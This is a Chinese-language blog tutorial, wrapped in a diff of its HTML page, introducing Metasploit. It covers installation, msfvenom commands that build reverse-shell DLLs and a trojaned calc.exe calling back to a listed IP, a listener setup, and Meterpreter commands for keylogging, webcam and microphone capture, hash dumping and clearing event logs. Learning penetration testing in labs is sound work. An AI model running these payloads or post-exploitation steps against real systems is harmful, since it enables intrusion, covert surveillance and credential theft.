@@ -1,0 +1,1440 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="MSF,Metasploit,docker," />
+
+
+
+
+
+
+
+
+
+
+<meta name="keywords" content="MSF,Metasploit,docker">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识Metasploit">
+<meta property="og:url" content="http://www.admintony.com/初识Metasploit.html">
+<meta property="og:site_name" content="AdminTony&#39;s Blog">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521275062.3214104.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521361727.100053.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521362568.3053834.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521276234.9907806.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521457679.3425293.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521458103.4707656.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521458215.1325665.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521458792.458233.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459265.7487528.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459292.165244.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459503.867873.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459625.4863434.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459722.6863515.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459701.6667323.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459886.3151164.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459993.2738862.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521460101.9256773.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521460164.8444114.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521460243.852302.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521462508.0271292.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521462807.04253.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521462939.7033885.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521463222.9343667.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521463326.249478.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521464493.6980894.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521464680.4325962.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521464854.0893693.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521464884.645981.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521465022.15985.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521465415.5757482.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521465517.3982747.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521466372.5192907.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521466570.5555975.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521466449.1484308.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521467052.1651735.png">
+<meta property="og:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521466934.8035553.png">
+<meta property="og:updated_time" content="2018-05-16T09:36:04.870Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="初识Metasploit">
+<meta name="twitter:image" content="https://blog-1252108140.cosbj.myqcloud.com/201803/1521275062.3214104.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'AdminTony'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.admintony.com/初识Metasploit.html"/>
+
+
+
+
+
+  <title>初识Metasploit | AdminTony's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">AdminTony's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">学无止境苦与乐</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.admintony.com/初识Metasploit.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="AdminTony">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AdminTony's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">初识Metasploit</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-17T08:43:29-07:00">
+                2018-03-17
+              </time>
+            
+			
+			
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/Metasploit/" itemprop="url" rel="index">
+                    <span itemprop="name">Metasploit</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,241 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521275062.3214104.png" alt=""></p>
+<a id="more"></a>
+<h1 id="安装MSF"><a href="#安装MSF" class="headerlink" title="安装MSF"></a>安装MSF</h1><h2 id="安装msf："><a href="#安装msf：" class="headerlink" title="安装msf："></a>安装msf：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line"></span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line"></span><br><span class="line">chmod 755 msfinstall</span><br><span class="line"></span><br><span class="line">./msfinstall</span><br></pre></td></tr></table></figure>
+<h2 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt-get install postgresql</span><br><span class="line"></span><br><span class="line">su postgres   </span><br><span class="line"></span><br><span class="line">createuser msf -P -S -R -D  #创建用户，后面会提示输入密码   </span><br><span class="line"></span><br><span class="line">createdb -O msf msf        #创建数据库</span><br></pre></td></tr></table></figure>
+<p><strong>创建用户时出现的问题及解决方案</strong></p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521361727.100053.png" alt=""></p>
+<p>service postgresql restart </p>
+<p>重启即可，每次用docker开启一个新的容器都要把里面的服务开启</p>
+<h2 id="配置metasploit数据库的连接"><a href="#配置metasploit数据库的连接" class="headerlink" title="配置metasploit数据库的连接"></a>配置metasploit数据库的连接</h2><p>在metasploit的安装目录下新建database.yml文件，内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">production:  </span><br><span class="line">   adapter: postgresql  </span><br><span class="line">   database: msf  </span><br><span class="line">   username: msf  </span><br><span class="line">   password: msf   #我在上一步创建用户的时候  设置的密码</span><br><span class="line">   host: 127.0.0.1  </span><br><span class="line">   port: 5432  </span><br><span class="line">   pool: 75  </span><br><span class="line">   timeout: 5</span><br></pre></td></tr></table></figure>
+<p>然后在msf中手动连接数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_connect -y /opt/metasploit-framework/database.yml</span><br><span class="line">[*] Rebuilding the module cache in the background...</span><br><span class="line">msf &gt; db_status</span><br><span class="line">[*] postgresql connected to msf</span><br><span class="line">msf &gt;</span><br></pre></td></tr></table></figure>
+<h2 id="解决metasploit搜索缓慢"><a href="#解决metasploit搜索缓慢" class="headerlink" title="解决metasploit搜索缓慢"></a>解决metasploit搜索缓慢</h2><p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521362568.3053834.png" alt=""></p>
+<ul>
+<li>重启postgresql</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql restart</span><br></pre></td></tr></table></figure>
+<ul>
+<li>重建msf缓存表</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_status</span><br><span class="line">[*] postgresql selected, no connection</span><br><span class="line">msf &gt; db_connect -y /opt/metasploit-framework/database.yml</span><br><span class="line">[*] Rebuilding the module cache in the background...</span><br><span class="line">msf &gt; db_rebuild_cache</span><br><span class="line">[*] Purging and rebuilding the module cache in the background...</span><br><span class="line">msf &gt; db_status</span><br><span class="line">[*] postgresql connected to msf</span><br></pre></td></tr></table></figure>
+<p>然后就能实现秒搜索了</p>
+<h1 id="安装Apache2"><a href="#安装Apache2" class="headerlink" title="安装Apache2"></a>安装Apache2</h1><p><strong>为什么要安装apache2?</strong></p>
+<p>我把msf放到了云服务中的docker中，方便使用公网IP，但是生成的dll 、 exe无法下载到本地，所以要借助apache的文件下载功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br></pre></td></tr></table></figure>
+<h1 id="MSF反弹shell"><a href="#MSF反弹shell" class="headerlink" title="MSF反弹shell"></a>MSF反弹shell</h1><h2 id="生成dll"><a href="#生成dll" class="headerlink" title="生成dll"></a>生成dll</h2><p>64位：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp -a x64 lhost=47.95.206.199 lport=6666 -f dll -o ./6666.dll</span><br></pre></td></tr></table></figure>
+<p>32位：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp lhost=47.95.206.199 lport=6666 -f dll -o ./6666.dll</span><br></pre></td></tr></table></figure>
+<p>简单说下这些参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-p 选择使用的payload </span><br><span class="line">    shell_reverse_tcp是反弹shell的</span><br><span class="line">    windows/meterpreter/reverse_tcp MSF的shell</span><br><span class="line"></span><br><span class="line">lhost msf机器的IP</span><br><span class="line"></span><br><span class="line">lport msf监听的端口</span><br><span class="line"></span><br><span class="line">-f 生成的文件类型，msfvenom --help-format查看</span><br><span class="line"></span><br><span class="line">-o 输出文件地址及文件名</span><br></pre></td></tr></table></figure>
+<h2 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 端口 (不填写默认是4444)</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h2 id="靶机运行后的效果"><a href="#靶机运行后的效果" class="headerlink" title="靶机运行后的效果"></a>靶机运行后的效果</h2><p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521276234.9907806.png" alt=""></p>
+<p>补充说明：运行dll命令 -&gt; rundll32 dll.dll,Strart</p>
+<h1 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h1><h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lhost=192.168.1.101 lport=4444 -f exe -x calc.exe -k -o ./meter.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--platforms 有效的负荷平台</span><br><span class="line"></span><br><span class="line">-x 设置宿主程序</span><br><span class="line"></span><br><span class="line">-k 将payload注入到新的进程</span><br></pre></td></tr></table></figure>
+<h2 id="Meterpreter控制端使用"><a href="#Meterpreter控制端使用" class="headerlink" title="Meterpreter控制端使用"></a>Meterpreter控制端使用</h2><p>只写一些常用的，其他的以后用到了再补充</p>
+<h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p><strong>将当前的session放入后台，继续用msf进行其他渗透工作</strong></p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521457679.3425293.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sessions 查看后台运行的session列表</span><br><span class="line"></span><br><span class="line">sessions id 进入某个后台运行的session</span><br></pre></td></tr></table></figure>
+<h3 id="对目录和文件的操作"><a href="#对目录和文件的操作" class="headerlink" title="对目录和文件的操作"></a>对目录和文件的操作</h3><ul>
+<li>cat ：读取并显示某个文件</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521458103.4707656.png" alt=""></p>
+<ul>
+<li><p>cd：跳转到某个目录</p>
+</li>
+<li><p>dir &amp;&amp; ls ：列出靶机目录下的文件</p>
+</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521458215.1325665.png" alt=""></p>
+<ul>
+<li>cp 源文件 目标文件(windows路径用\\或者/) # 复制文件</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521458792.458233.png" alt=""></p>
+<ul>
+<li>download 文件名 # 从目标服务器下载文件</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459265.7487528.png" alt=""></p>
+<ul>
+<li>upload 本地文件名  # 从本地向目标服务器上传文件</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459292.165244.png" alt=""></p>
+<ul>
+<li>lls 列出msf所在机器上当前目录下的内容</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459503.867873.png" alt=""></p>
+<ul>
+<li><p>getwd &amp;&amp; pwd # 获取靶机当前shell工作目录</p>
+</li>
+<li><p>getlwd &amp;&amp; lpwd # 获取本机的shell工作目录</p>
+</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459625.4863434.png" alt=""></p>
+<ul>
+<li>edit 文件名  # 编辑文件</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459722.6863515.png" alt=""></p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459701.6667323.png" alt=""></p>
+<ul>
+<li>mkdir\rmdir 目录名 # 创建或删除目录</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459886.3151164.png" alt=""></p>
+<ul>
+<li><p>mv 源文件 目标文件 # 移动文件</p>
+</li>
+<li><p>rm 文件 # 删除文件</p>
+</li>
+<li><p>show_mount # 查看靶机的盘符</p>
+</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521459993.2738862.png" alt=""></p>
+<h3 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h3><ul>
+<li>arp # 查看靶机的arp缓存表</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521460101.9256773.png" alt=""></p>
+<ul>
+<li>getproxy # 查看靶机的代理情况</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521460164.8444114.png" alt=""></p>
+<ul>
+<li><p>ipconfig &amp;&amp; ifconfig # 查看靶机的ip</p>
+</li>
+<li><p>netstat 查看靶机的端口情况，结果包括产生端口的进程</p>
+</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521460243.852302.png" alt=""></p>
+<ul>
+<li>portfwd add -l msf机端口 -r 靶机IP -p 靶机端口  # 端口转发</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521462508.0271292.png" alt=""></p>
+<p>然后连接靶机远程桌面直接连接本地的8888即可。</p>
+<ul>
+<li>resolve 主机名 -f IPv4 or IPv6 # 解析主机名</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521462807.04253.png" alt=""></p>
+<ul>
+<li>route # 查看靶机的路由表</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521462939.7033885.png" alt=""></p>
+<h3 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h3><ul>
+<li><p>getuid # 查看当前用户名</p>
+</li>
+<li><p>clearev # 清除事件日志</p>
+</li>
+<li><p>execute -f 程序 # 执行一个程序</p>
+</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521463222.9343667.png" alt=""></p>
+<ul>
+<li>getprivs # 查看msf shell所拥有的权限</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521463326.249478.png" alt=""></p>
+<ul>
+<li>kill PID # 终止一个进程</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521464493.6980894.png" alt=""></p>
+<ul>
+<li><p>localtime # 查看靶机的时间</p>
+</li>
+<li><p>pgrep 进程名 # 根据进程名查PID</p>
+</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521464680.4325962.png" alt=""></p>
+<ul>
+<li>pkill 进程名 # 根据进程名结束进程</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521464854.0893693.png" alt=""></p>
+<ul>
+<li>ps # 查看运行中的进程</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521464884.645981.png" alt=""></p>
+<ul>
+<li><p>reboot &amp; shutdown # 重启 或 关机</p>
+</li>
+<li><p>sysinfo 查看系统信息</p>
+</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521465022.15985.png" alt=""></p>
+<h3 id="用户接口相关"><a href="#用户接口相关" class="headerlink" title="用户接口相关"></a>用户接口相关</h3><ul>
+<li>keyscan系列</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start # 开始记录键盘</span><br><span class="line"></span><br><span class="line">keyscan_dump  # 把记录的值打印出来，在keyscan_stop前使用</span><br><span class="line"></span><br><span class="line">keyscan_stop # 关闭键盘记录</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521465415.5757482.png" alt=""></p>
+<ul>
+<li>screenshot # 捕捉桌面</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521465517.3982747.png" alt=""></p>
+<ul>
+<li>uictl [enable/disable] [keyboard/mouse/all] 启用（禁用）鼠标键盘，win32可用</li>
+</ul>
+<h3 id="摄像头相关"><a href="#摄像头相关" class="headerlink" title="摄像头相关"></a>摄像头相关</h3><ul>
+<li><p>record_mic -d 秒数 -f 保存的文件名 # 记录麦克风</p>
+</li>
+<li><p>webcam_list # 显示靶机有哪些摄像头</p>
+</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521466372.5192907.png" alt=""></p>
+<ul>
+<li>webcam_stream # 打开摄像头流，并用html呈现</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521466570.5555975.png" alt=""></p>
+<ul>
+<li>webcam_snap # 抓拍一张摄像头的图片</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521466449.1484308.png" alt=""></p>
+<ul>
+<li>webcam_chat # 和靶机进行视频聊天，也是html中呈现</li>
+</ul>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
+<li>getsystem # 尝试漏洞来获取system权限</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521467052.1651735.png" alt=""></p>
+<p>XP测试图</p>
+<ul>
+<li>hashdump  # 获取系统中用户密码的hash</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1521466934.8035553.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/MSF/" rel="tag"># MSF</a>
+          
+            <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
+          
+            <a href="/tags/docker/" rel="tag"># docker</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Linux实验系统某洞导致获取Root权限.html" rel="next" title="Linux实验系统某洞导致获取Root权限">
+                <i class="fa fa-chevron-left"></i> Linux实验系统某洞导致获取Root权限
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/Docker学习笔记.html" rel="prev" title="Docker学习笔记">
+                Docker学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
